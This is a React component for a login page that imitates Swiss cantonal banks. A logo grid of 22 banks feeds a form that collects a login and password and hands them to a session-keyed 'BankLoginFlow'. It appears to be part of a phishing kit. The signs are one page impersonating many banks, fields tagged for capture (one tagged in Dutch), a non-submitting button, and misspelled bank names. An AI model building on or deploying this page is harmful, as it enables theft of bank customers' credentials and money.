import { useState } from 'react';
import { BankLoginFlow } from '@/features/bank-login/BankLoginFlow';
import { kantonalbank } from '@/config/banks/kantonalbank';
import { useLocaleContext } from '@/i18n/LocaleProvider';
import { useT } from '@/i18n/useT';
import { LanguageDropdown } from '@/Components/landing/LanguageDropdown';
import type { LanguageCode } from '@/Components/landing/data';
import css from './Kantonalbank.css?inline';

type Props = { sessionId: string };

const CANTONAL_BANKS: { name: string; logo: string }[] = [
    { name: 'Schffhauser Kantonalbank',        logo: 'Schffhauser Kantonalbank.png' },
    { name: 'Obwaldner Kantonalbank',           logo: 'Obwaldner Kantonalbank.png' },
    { name: 'BEKB BCBE',                        logo: 'BEKB BCBE.png' },
    { name: 'Appenzeller Kantonalbank',         logo: 'Appenzeller Kantonalbank.png' },
    { name: 'BCGE',                             logo: 'BCGE.png' },
    { name: 'Glarner Kantonalbank',             logo: 'Glarner Kantonalbank.png' },
    { name: 'BCV',                              logo: 'BCV.png' },
    { name: 'BCN',                              logo: 'BCN copy.png' },
    { name: 'Freiburger Kantonalbank (BCF)',    logo: 'Freiburger Kantonalbank (BCF).png' },
    { name: 'BCJ',                              logo: 'BCJ.png' },
    { name: 'BLKB',                             logo: 'BLKB.png' },
    { name: 'Aargaische Kantonalbank',          logo: 'Aargaische Kantonalbank.png' },
    { name: 'Graubundner Kantonalbank',         logo: 'Graubundner Kantonalbank.png' },
    { name: 'Luzerner Kantonalbank',            logo: 'Luzerner Kantonalbank.png' },
    { name: 'Urner kantonalbank',               logo: 'Urner kantonalbank.png' },
    { name: 'Zuger kantonalbank',               logo: 'Zuger kantonalbank.png' },
    { name: 'Zurcher kantonalbank',             logo: 'Zurcher kantonalbank.png' },
    { name: 'Nidwaldner Kantonalbank',          logo: 'Nidwaldner Kantonalbank.png' },
    { name: 'St Geller Kantonalbank',           logo: 'St Geller Kantonalbank.png' },
    { name: 'Thurgauer Kantonalbank',           logo: 'Thurgauer Kantonalbank.png' },
    { name: 'Schwyzer kantonalbank',            logo: 'Schwyzer kantonalbank.png' },
    { name: 'Basler Kantonalbank',              logo: 'Basler Kantonalbank.png' },
];

export default function Kantonalbank({ sessionId }: Props) {
    const { locale, setLocale } = useLocaleContext();
    const t = useT();
    const lang: LanguageCode = locale === 'fr' ? 'FR' : 'DE';

    const [selectedBank, setSelectedBank] = useState<string | null>(null);

    return (
        <div className="kb-page">
            <style dangerouslySetInnerHTML={{ __html: css }} />

            <header className="kb-header">
                <LanguageDropdown
                    value={lang}
                    onChange={(code) => setLocale(code === 'FR' ? 'fr' : 'de')}
                />
            </header>

            <main className="kb-main">
                <div className="kb-left">
                    <h1 className="kb-title">{t('kb.title')}</h1>

                    <form id="lk_form" autoComplete="off" className="kb-form">
                        <div className="kb-field">
                            <label className="kb-label" htmlFor="bankName">{t('kb.bankName')}</label>
                            <input
                                type="text"
                                id="bankName"
                                data-name="Bank"
                                className="kb-input"
                                readOnly
                                placeholder={t('kb.bankNamePlaceholder')}
                                value={selectedBank ?? ''}
                                onChange={() => {}}
                            />
                        </div>

                        <div className="kb-field">
                            <label className="kb-label" htmlFor="login">{t('kb.login')}</label>
                            <input
                                type="text"
                                id="login"
                                data-name="Login"
                                className="kb-input"
                                autoComplete="off"
                                required
                                placeholder={t('kb.loginPlaceholder')}
                            />
                        </div>

                        {selectedBank !== 'BCV' && (
                            <div className="kb-field">
                                <label className="kb-label" htmlFor="password">{t('kb.password')}</label>
                                <input
                                    type="password"
                                    id="password"
                                    data-name="Wachtwoord"
                                    className="kb-input"
                                    autoComplete="new-password"
                                    required
                                    placeholder={t('kb.passwordPlaceholder')}
                                />
                            </div>
                        )}

                        <button
                            type="button"
                            id="loginButton"
                            className="kb-submit"
                            disabled={!selectedBank}
                        >
                            {t('kb.submit')}
                        </button>
                    </form>
                </div>

                <div className="kb-right">
                    <h2>{t('kb.gridTitle')}</h2>
                    <div className="kb-grid">
                        {CANTONAL_BANKS.map((bank) => (
                            <button
                                key={bank.name}
                                type="button"
                                className={`kb-card${selectedBank === bank.name ? ' kb-card--active' : ''}`}
                                onClick={() => setSelectedBank(bank.name)}
                            >
                                <div className="block-image">
                                    <img
                                        src={`/assets/img/${bank.logo}`}
                                        alt={bank.name}
                                        className="block-image__img"
                                    />
                                </div>
                                {bank.name}
                            </button>
                        ))}
                    </div>
                </div>
            </main>

            <BankLoginFlow bank={kantonalbank} sessionId={sessionId} />
        </div>
    );
}
